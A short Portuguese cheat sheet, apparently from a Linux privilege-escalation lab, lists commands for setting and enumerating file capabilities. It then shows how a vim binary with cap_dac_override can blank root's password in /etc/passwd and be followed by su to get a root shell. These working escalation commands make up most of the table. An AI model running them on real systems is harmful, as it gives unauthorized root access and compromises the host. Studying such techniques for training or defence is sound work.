# Comandos Principais - Capabilities

| Comando | Objetivo | Resultado esperado |
|---|---|---|
| `sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic` | Definir capability em um binário | Binário com capability aplicada |
| `getcap /usr/bin/vim.basic` | Ver capabilities de um binário específico | Capability exibida (ex.: `cap_dac_override=eip`) |
| `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` | Enumerar capabilities em binários comuns | Lista de binários com capabilities |
| `cat /etc/passwd | head -n1` | Inspecionar a entrada do usuário root | Linha atual do root no `/etc/passwd` |
| `/usr/bin/vim.basic /etc/passwd` | Editar arquivo protegido usando capability no vim | Acesso de edição ao arquivo alvo |
| `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd` | Alterar `/etc/passwd` em modo não interativo | Mudança aplicada na linha do root |
| `su` | Tentar troca para root após modificação | Shell root (no cenário vulnerável do exemplo) |

